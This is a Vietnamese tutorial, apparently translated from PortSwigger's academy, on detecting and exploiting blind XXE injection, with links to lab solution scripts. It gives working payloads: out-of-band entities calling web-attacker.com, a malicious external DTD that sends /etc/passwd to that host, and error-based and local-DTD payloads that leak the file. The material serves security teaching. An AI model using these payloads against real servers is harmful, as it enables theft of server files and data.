# XXE mù là gì?  
Lỗ hổng XXE mù phát sinh khi ứng dụng dễ bị tấn công bằng phương pháp chèn XXE nhưng không trả về giá trị của bất kỳ thực thể bên ngoài nào được định nghĩa trong phản hồi của nó. Điều này có nghĩa là việc truy xuất trực tiếp các tệp phía máy chủ là không thể, do đó lỗ hổng XXE mù thường khó khai thác hơn so với các lỗ hổng XXE thông thường.

Có hai cách chính để tìm và khai thác các lỗ hổng XXE ẩn:

* Bạn có thể kích hoạt các tương tác mạng ngoài luồng, đôi khi làm rò rỉ dữ liệu nhạy cảm trong dữ liệu tương tác đó.
* Bạn có thể gây ra lỗi phân tích cú pháp XML theo cách mà các thông báo lỗi chứa dữ liệu nhạy cảm.  

# Phát hiện XXE mù bằng kỹ thuật ngoài băng tần (OAST)  
Bạn thường có thể phát hiện tấn công XXE mù bằng kỹ thuật tương tự như đối với các cuộc tấn công XXE SSRF nhưng kích hoạt tương tác mạng ngoài băng tần đến một hệ thống mà bạn kiểm soát. Ví dụ, bạn sẽ định nghĩa một thực thể bên ngoài như sau:  

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```  

Sau đó, bạn sẽ sử dụng thực thể đã được định nghĩa trong một giá trị dữ liệu bên trong XML.

Cuộc tấn công XXE này khiến máy chủ thực hiện yêu cầu HTTP phía máy chủ đến URL được chỉ định. Kẻ tấn công có thể theo dõi quá trình tra cứu DNS và yêu cầu HTTP diễn ra, từ đó phát hiện ra rằng cuộc tấn công XXE đã thành công.  

## Thí nghiệm: XXE mù với tương tác ngoài băng tần  
[Solution](https://github.com/ncKien05/PortSwigger/blob/main/XXE_injection/Solution/lab5.py)  

Đôi khi, các cuộc tấn công XXE sử dụng các thực thể thông thường bị chặn do một số cơ chế xác thực đầu vào của ứng dụng hoặc do việc tăng cường bảo mật của trình phân tích cú pháp XML đang được sử dụng. Trong trường hợp này, bạn có thể sử dụng các thực thể tham số XML thay thế. Các thực thể tham số XML là một loại thực thể XML đặc biệt chỉ có thể được tham chiếu ở nơi khác trong DTD. Đối với mục đích hiện tại, bạn chỉ cần biết hai điều. Thứ nhất, khai báo của một thực thể tham số XML bao gồm ký tự phần trăm trước tên thực thể:

`<!ENTITY % myparameterentity "my parameter entity value" >`

Thứ hai, các thực thể tham số được tham chiếu bằng ký tự phần trăm thay vì ký hiệu và (&) thông thường:  

`%myparameterentity;`  

Điều này có nghĩa là bạn có thể kiểm tra lỗ hổng XXE ẩn bằng cách sử dụng phương pháp phát hiện ngoài băng tần thông qua các thực thể tham số XML như sau:

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`  

Đoạn mã tấn công XXE này khai báo một thực thể tham số XML có tên `xxe` và sau đó sử dụng thực thể đó trong DTD. Điều này sẽ gây ra việc tra cứu DNS và yêu cầu HTTP đến miền của kẻ tấn công, xác minh rằng cuộc tấn công đã thành công.  

## Thí nghiệm: XXE mù với tương tác ngoài băng tần thông qua các thực thể tham số XML  
[Solution](https://github.com/ncKien05/PortSwigger/blob/main/XXE_injection/Solution/lab6.py)  

# Khai thác lỗ hổng XXE ẩn để đánh cắp dữ liệu ngoài băng tần  
Việc phát hiện lỗ hổng XXE ẩn thông qua các kỹ thuật ngoài băng tần là rất tốt, nhưng nó không thực sự cho thấy cách thức khai thác lỗ hổng đó. Điều mà kẻ tấn công thực sự muốn đạt được là đánh cắp dữ liệu nhạy cảm. Điều này có thể đạt được thông qua lỗ hổng XXE ẩn, nhưng nó liên quan đến việc kẻ tấn công lưu trữ một DTD độc hại trên hệ thống mà chúng kiểm soát, và sau đó gọi DTD bên ngoài từ bên trong payload XXE trong băng tần.

Ví dụ về một DTD độc hại nhằm đánh cắp nội dung của tập tin `/etc/passwd` như sau:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
DTD này thực hiện các bước sau:  

* Định nghĩa một thực thể tham số XML có tên là `file`, chứa nội dung của tệp `/etc/passwd`.
* Định nghĩa một thực thể tham số XML có tên là `eval`, chứa một khai báo động của một thực thể tham số XML khác có tên là `exfiltrate`. Thực thể `exfiltrate` sẽ được đánh giá bằng cách thực hiện một yêu cầu HTTP tới máy chủ web của kẻ tấn công, trong đó giá trị của `file` được chứa trong chuỗi truy vấn URL.
* Sử dụng thực thể `eval` này, dẫn đến việc khai báo động thực thể `exfiltrate` được thực hiện.
* Sử dụng thực thể `exfiltrate` đó để giá trị của nó được đánh giá bằng cách yêu cầu URL được chỉ định.  

Kẻ tấn công sau đó phải lưu trữ DTD độc hại trên một hệ thống mà chúng kiểm soát, thông thường bằng cách tải nó lên máy chủ web của riêng chúng. Ví dụ, kẻ tấn công có thể cung cấp DTD độc hại tại URL sau:

```http://web-attacker.com/malicious.dtd```  

Cuối cùng, kẻ tấn công phải gửi đoạn mã XXE sau đến ứng dụng dễ bị tổn thương:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

Đoạn mã tấn công XXE này khai báo một thực thể tham số XML có tên `xxe` và sau đó sử dụng thực thể đó trong DTD. Điều này sẽ khiến trình phân tích cú pháp XML lấy DTD bên ngoài từ máy chủ của kẻ tấn công và diễn giải nó trực tiếp. Các bước được định nghĩa trong DTD độc hại sau đó được thực thi và tệp `/etc/passwd` được truyền đến máy chủ của kẻ tấn công.  

### Thực hành: Khai thác lỗ hổng XXE ẩn để đánh cắp dữ liệu bằng cách sử dụng DTD bên ngoài độc hại.  
[Solution](https://github.com/ncKien05/PortSwigger/blob/main/XXE_injection/Solution/lab7.py)  

# Khai thác lỗ hổng XXE ẩn để lấy dữ liệu thông qua thông báo lỗi.  
Một cách tiếp cận khác để khai thác lỗ hổng XXE ẩn là tạo ra lỗi phân tích cú pháp XML, trong đó thông báo lỗi chứa dữ liệu nhạy cảm mà bạn muốn lấy. Điều này sẽ hiệu quả nếu ứng dụng trả về thông báo lỗi đó trong phản hồi của nó.

Bạn có thể kích hoạt thông báo lỗi phân tích cú pháp XML chứa nội dung của tệp `/etc/passwd` bằng cách sử dụng DTD bên ngoài độc hại như sau:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

DTD này thực hiện các bước sau:

* Định nghĩa một thực thể tham số XML có tên là `file`, chứa nội dung của tệp `/etc/passwd`.
* Định nghĩa một thực thể tham số XML có tên là `eval` , chứa một khai báo động của một thực thể tham số XML khác có tên là `error`. Thực thể này sẽ được đánh giá bằng cách tải một tệp không tồn tại có tên chứa giá trị của `file` thực thể.
* Sử dụng thực thể `eval` này, dẫn đến việc khai báo động thực thể `error`được thực hiện.
* Chương trình sử dụng thực thể `error` này để đánh giá giá trị của nó bằng cách cố gắng tải tệp không tồn tại, dẫn đến thông báo lỗi chứa tên của tệp không tồn tại, chính là nội dung của tệp `/etc/passwd` đó.

Việc gọi DTD bên ngoài độc hại sẽ dẫn đến thông báo lỗi như sau:

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

### Thực hành: Khai thác lỗ hổng XXE ẩn để lấy dữ liệu thông qua thông báo lỗi.  
[Solution](https://github.com/ncKien05/PortSwigger/blob/main/XXE_injection/Solution/lab8.py)  

# Khai thác lỗ hổng XXE ẩn bằng cách tái sử dụng DTD cục bộ  

Kỹ thuật nêu trên hoạt động tốt với DTD bên ngoài, nhưng thường không hoạt động với DTD nội bộ được chỉ định đầy đủ bên trong phần tử `DOCTYPE`. Điều này là do kỹ thuật này liên quan đến việc sử dụng một thực thể tham số XML trong định nghĩa của một thực thể tham số khác. Theo đặc tả XML, điều này được cho phép trong DTD bên ngoài nhưng không được phép trong DTD nội bộ. (Một số trình phân tích cú pháp có thể chấp nhận điều này, nhưng nhiều trình phân tích cú pháp khác thì không.)

Vậy còn các lỗ hổng XXE ẩn khi các tương tác ngoài băng tần bị chặn thì sao? Bạn không thể đánh cắp dữ liệu qua kết nối ngoài băng tần, và bạn cũng không thể tải DTD bên ngoài từ máy chủ từ xa.

Trong trường hợp này, vẫn có thể xảy ra tình trạng thông báo lỗi chứa dữ liệu nhạy cảm do lỗ hổng trong đặc tả ngôn ngữ XML. Nếu DTD của tài liệu sử dụng kết hợp giữa khai báo DTD nội bộ và bên ngoài, thì DTD nội bộ có thể định nghĩa lại các thực thể được khai báo trong DTD bên ngoài. Khi điều này xảy ra, hạn chế về việc sử dụng một thực thể tham số XML trong định nghĩa của một thực thể tham số khác sẽ được nới lỏng.

Điều này có nghĩa là kẻ tấn công có thể sử dụng kỹ thuật XXE dựa trên lỗi từ bên trong một DTD nội bộ, miễn là thực thể tham số XML mà chúng sử dụng đang định nghĩa lại một thực thể được khai báo trong một DTD bên ngoài. Tất nhiên, nếu các kết nối ngoài băng tần bị chặn, thì DTD bên ngoài không thể được tải từ xa. Thay vào đó, nó cần phải là một tệp DTD bên ngoài nằm cục bộ trên máy chủ ứng dụng. Về cơ bản, cuộc tấn công liên quan đến việc gọi một tệp DTD hiện có trên hệ thống tệp cục bộ và sử dụng lại nó để định nghĩa lại một thực thể hiện có theo cách gây ra lỗi phân tích cú pháp chứa dữ liệu nhạy cảm. Kỹ thuật này được tiên phong bởi Arseniy Sharoglazov và được xếp hạng thứ 7 trong top 10 kỹ thuật tấn công web năm 2018 của chúng tôi .

Ví dụ, giả sử có một tệp DTD trên hệ thống tệp của máy chủ tại vị trí `/usr/local/app/schema.dtd`, và tệp DTD này định nghĩa một thực thể có tên là `custom_entity`. Kẻ tấn công có thể kích hoạt thông báo lỗi phân tích cú pháp XML chứa nội dung của `/etc/passwd` bằng cách gửi một DTD lai như sau:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

DTD này thực hiện các bước sau:

* Định nghĩa một thực thể tham số XML có tên là `local_dtd`, chứa nội dung của tệp DTD bên ngoài tồn tại trên hệ thống tệp của máy chủ.
* Định nghĩa lại thực thể tham số XML có tên là `custom_entity`, thực thể này đã được định nghĩa trong tệp DTD bên ngoài. Thực thể này được định nghĩa lại là chứa lỗ hổng XXE dựa trên lỗi đã được mô tả trước đó, nhằm kích hoạt thông báo lỗi chứa nội dung của `/etc/passwd`.
* Sử dụng thực thể `local_dtd` để diễn giải DTD bên ngoài, bao gồm cả giá trị được định nghĩa lại của thực thể `custom_entity`. Điều này dẫn đến thông báo lỗi mong muốn.

## Tìm kiếm tệp DTD hiện có để sử dụng lại.  
Vì cuộc tấn công XXE này liên quan đến việc sử dụng lại một DTD hiện có trên hệ thống tệp của máy chủ, nên yêu cầu quan trọng là phải tìm được một tệp phù hợp. Điều này thực ra khá đơn giản. Bởi vì ứng dụng trả về bất kỳ thông báo lỗi nào do trình phân tích cú pháp XML đưa ra, bạn có thể dễ dàng liệt kê các tệp DTD cục bộ chỉ bằng cách cố gắng tải chúng từ bên trong DTD nội bộ.

Ví dụ, các hệ thống Linux sử dụng môi trường máy tính để bàn GNOME thường có một tệp DTD tại `/usr/share/yelp/dtd/docbookx.dtd`. Bạn có thể kiểm tra xem tệp này có tồn tại hay không bằng cách gửi đoạn mã XXE sau, đoạn mã này sẽ gây ra lỗi nếu tệp bị thiếu:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

Sau khi bạn đã kiểm tra danh sách các tệp DTD thông dụng để xác định vị trí tệp cần tìm, bạn cần sao chép tệp đó và xem xét để tìm ra thực thể mà bạn có thể định nghĩa lại. Vì nhiều hệ thống thông dụng bao gồm các tệp DTD là mã nguồn mở, bạn thường có thể nhanh chóng sao chép các tệp thông qua tìm kiếm trên internet.

### Bài thực hành: Khai thác lỗ hổng XXE để truy xuất dữ liệu bằng cách tái sử dụng DTD cục bộ.  
[Solution](https://github.com/ncKien05/PortSwigger/blob/main/XXE_injection/Solution/lab9.py)